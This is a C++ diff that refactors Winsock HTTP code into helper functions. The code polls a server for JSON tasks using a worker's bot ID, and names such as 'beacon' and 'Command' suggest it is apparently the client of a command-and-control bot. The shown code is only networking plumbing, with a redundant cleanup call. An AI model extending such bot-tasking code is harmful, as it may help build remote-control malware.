@@ -252,35 +252,6 @@ Command beacon(const char* serverIP, int serverPort, Worker worker) {
 }
 
 Task request(const char* serverIP, int serverPort, Worker worker) {
-    // Initialize Winsock
-    WSADATA wsaData;
-    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
-        std::cerr << "Failed to initialize Winsock." << std::endl;
-        return Task();
-    }
-
-    // Create a socket
-    SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);
-    if (sock == INVALID_SOCKET) {
-        std::cerr << "Failed to create socket." << std::endl;
-        WSACleanup();
-        return Task();
-    }
-    // Set the server address
-    sockaddr_in serverAddress;
-    serverAddress.sin_family = AF_INET;
-    serverAddress.sin_addr.s_addr = inet_addr(serverIP);
-    serverAddress.sin_port = htons(serverPort);
-
-    // Connect to the server
-    if (connect(sock, reinterpret_cast<sockaddr*>(&serverAddress), sizeof(serverAddress)) == SOCKET_ERROR) {
-        std::cerr << "Failed to connect to the server." << std::endl;
-        closesocket(sock);
-        WSACleanup();
-        return Task();
-    }
-
-    // Send an HTTP request to the API endpoint
     int bot_id = worker.id;
 
     // Construct the query string
@@ -293,56 +264,27 @@ Task request(const char* serverIP, int serverPort, Worker worker) {
         "Content-Type: application/json\r\n"
         "\r\n";
 
-    if (send(sock, httpRequest.c_str(), httpRequest.length(), 0) == SOCKET_ERROR) {
-        std::cerr << "Failed to send HTTP request." << std::endl;
-        closesocket(sock);
-        WSACleanup();
-        return Task();
-    }
-
-    char buffer[1024]; // Assuming a buffer size of 1024 is sufficient for the response
-
-    int bytesReadResp = recv(sock, buffer, sizeof(buffer), 0);
-    if (bytesReadResp == SOCKET_ERROR) {
-        std::cerr << "Failed to receive HTTP response." << std::endl;
-        closesocket(sock);
-        WSACleanup();
-        return Task();
-    }
-
-    std::string httpResponse(buffer, bytesReadResp);
+    std::string httpResponse = makeHttpRequest(serverIP, serverPort, httpRequest);
     if (httpResponse.find("HTTP/1.1 204 No Content") != std::string::npos) {
         std::cerr << "No Tasks available" << std::endl;
-            closesocket(sock);
             WSACleanup();
             return Task();
     }
 
     if (httpResponse.find("HTTP/1.1 200 OK") == std::string::npos) {
         std::cerr << "Unexpected HTTP response status: " << httpResponse << std::endl;
-        closesocket(sock);
         WSACleanup();
         return Task();
     }
 
-    size_t firstBrace = httpResponse.find_first_of('{');
-    size_t lastBrace = httpResponse.find_last_of('}');
-    std::string extractedJSON;
-    if (firstBrace != std::string::npos && lastBrace != std::string::npos && lastBrace > firstBrace) {
-        extractedJSON = httpResponse.substr(firstBrace, lastBrace - firstBrace + 1);
-        //std::cout << "Extracted JSON: " << extractedJSON << std::endl;
-    }
-    else {
-        std::cout << "JSON not found in the input string." << std::endl;
-    }
-
     // Parse the JSON response data
+    std::string extractedJSON = extractJSON(httpResponse);
+
     rapidjson::Document document;
     document.Parse(extractedJSON.c_str());
 
     if (document.HasParseError()) {
         std::cerr << "Failed to parse JSON." << std::endl;
-        closesocket(sock);
         WSACleanup();
         return Task();
     }
@@ -378,9 +320,75 @@ Task request(const char* serverIP, int serverPort, Worker worker) {
     }
 
     // Clean up
-    closesocket(sock);
     WSACleanup();
     return taskObject;
+}
+
+std::string extractJSON(std::string json) {
+    size_t firstBrace = json.find_first_of('{');
+    size_t lastBrace = json.find_last_of('}');
+    std::string extractedJSON;
+    if (firstBrace != std::string::npos && lastBrace != std::string::npos && lastBrace > firstBrace) {
+        extractedJSON = json.substr(firstBrace, lastBrace - firstBrace + 1);
+        //std::cout << "Extracted JSON: " << extractedJSON << std::endl;
+    }
+    else {
+        std::cout << "JSON not found in the input string." << std::endl;
+    }
+    return extractedJSON;
+}
+
+std::string makeHttpRequest(const char* serverIP, int serverPort, std::string httpRequest) {
+    // Initialize Winsock
+    WSADATA wsaData;
+    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
+        std::cerr << "Failed to initialize Winsock." << std::endl;
+        return "0";
+    }
+
+    // Create a socket
+    SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);
+    if (sock == INVALID_SOCKET) {
+        std::cerr << "Failed to create socket." << std::endl;
+        WSACleanup();
+        return "0";
+    }
+    // Set the server address
+    sockaddr_in serverAddress;
+    serverAddress.sin_family = AF_INET;
+    serverAddress.sin_addr.s_addr = inet_addr(serverIP);
+    serverAddress.sin_port = htons(serverPort);
+
+    // Connect to the server
+    if (connect(sock, reinterpret_cast<sockaddr*>(&serverAddress), sizeof(serverAddress)) == SOCKET_ERROR) {
+        std::cerr << "Failed to connect to the server." << std::endl;
+        closesocket(sock);
+        WSACleanup();
+        return "0";
+    }
+
+    if (send(sock, httpRequest.c_str(), httpRequest.length(), 0) == SOCKET_ERROR) {
+        std::cerr << "Failed to send HTTP request." << std::endl;
+        closesocket(sock);
+        WSACleanup();
+        return "0";
+    }
+
+    char buffer[1024]; // Assuming a buffer size of 1024 is sufficient for the response
+
+    int bytesReadResp = recv(sock, buffer, sizeof(buffer), 0);
+    if (bytesReadResp == SOCKET_ERROR) {
+        std::cerr << "Failed to receive HTTP response." << std::endl;
+        closesocket(sock);
+        WSACleanup();
+        return "0";
+    }
+
+    std::string httpResponse(buffer, bytesReadResp);
+    // Clean up
+    closesocket(sock);
+    WSACleanup();
+    return httpResponse;
 }
 
 in_addr getIpAddress() {
